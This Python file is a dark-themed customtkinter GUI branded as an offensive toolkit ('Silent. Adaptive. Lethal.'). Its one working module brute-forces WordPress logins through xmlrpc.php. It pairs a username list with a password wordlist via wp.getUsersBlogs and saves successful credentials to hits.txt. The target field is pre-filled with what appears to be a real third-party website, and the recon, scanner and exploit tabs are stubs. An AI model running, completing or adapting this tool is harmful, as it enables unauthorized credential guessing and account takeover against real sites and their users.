import customtkinter as ctk
from tkinter import filedialog, messagebox
import threading

# === Setup ===
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

app = ctk.CTk()
app.geometry("900x650")
app.title("X-Vector Pro | Silent. Adaptive. Lethal.")

# === Tabbed Layout ===
tabs = ctk.CTkTabview(app, width=880, height=620)
tabs.pack(padx=10, pady=10)

# === Add Tabs ===
recon_tab = tabs.add("Recon")
scanner_tab = tabs.add("Scanner")
brute_tab = tabs.add("Brute Force")
exploit_tab = tabs.add("Exploits")
logs_tab = tabs.add("Logs")
settings_tab = tabs.add("Settings")

# =====================
# === BRUTE FORCE TAB
# =====================
def run_brute_force():
    target = target_entry.get().strip()
    usernames = [u.strip() for u in usernames_box.get("1.0", "end").strip().splitlines()]
    wordlist_path = wordlist_entry.get().strip()

    if not target or not usernames or not wordlist_path:
        messagebox.showerror("Error", "Please fill all fields.")
        return

    try:
        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        messagebox.showerror("File Error", f"Cannot read password list:\n{e}")
        return

    log_box.insert("end", "[*] Starting brute force...\n")
    server = xmlrpc.client.ServerProxy(target)

    for user in usernames:
        log_box.insert("end", f"\n[*] Trying user: {user}\n")
        for password in passwords:
            try:
                resp = server.wp.getUsersBlogs(user, password)
                if resp:
                    hit = f"[+] HIT: {user}:{password}\n"
                    log_box.insert("end", hit)
                    with open("hits.txt", "a") as hit_file:
                        hit_file.write(f"{user}:{password}\n")
                    break
            except xmlrpc.client.Fault:
                pass
            except Exception as e:
                log_box.insert("end", f"[-] Error with {user}: {e}\n")
                break
    log_box.insert("end", "[*] Brute force finished.\n")

def browse_wordlist():
    path = filedialog.askopenfilename()
    if path:
        wordlist_entry.delete(0, "end")
        wordlist_entry.insert(0, path)

import xmlrpc.client  # moved up for logic reuse

ctk.CTkLabel(brute_tab, text="Target URL (https://example.com/xmlrpc.php)").pack(pady=5)
target_entry = ctk.CTkEntry(brute_tab, width=700)
target_entry.insert(0, "https://www.zayachek.com/xmlrpc.php")
target_entry.pack()

ctk.CTkLabel(brute_tab, text="Usernames (one per line)").pack(pady=5)
usernames_box = ctk.CTkTextbox(brute_tab, height=100, width=700)
usernames_box.insert("0.0", "admin\neditor\nauthor")
usernames_box.pack()

ctk.CTkLabel(brute_tab, text="Password List").pack(pady=5)
wordlist_frame = ctk.CTkFrame(brute_tab)
wordlist_frame.pack()
wordlist_entry = ctk.CTkEntry(wordlist_frame, width=500)
wordlist_entry.pack(side="left", padx=5)
browse_btn = ctk.CTkButton(wordlist_frame, text="Browse", command=browse_wordlist)
browse_btn.pack(side="left")

start_btn = ctk.CTkButton(brute_tab, text="Start Brute Force", fg_color="green", hover_color="darkgreen",
                          command=lambda: threading.Thread(target=run_brute_force).start())
start_btn.pack(pady=10)

log_box = ctk.CTkTextbox(brute_tab, height=200, width=700)
log_box.pack()

# ==========================
# === STUBS FOR OTHER TABS
# ==========================

ctk.CTkLabel(recon_tab, text="Recon module coming soon...").pack(pady=20)
ctk.CTkLabel(scanner_tab, text="Scanner module coming soon...").pack(pady=20)
ctk.CTkLabel(exploit_tab, text="Exploit module coming soon...").pack(pady=20)
ctk.CTkLabel(logs_tab, text="Logs will appear here.").pack(pady=20)
ctk.CTkLabel(settings_tab, text="Settings module coming soon...").pack(pady=20)

# === Start GUI ===
app.mainloop()
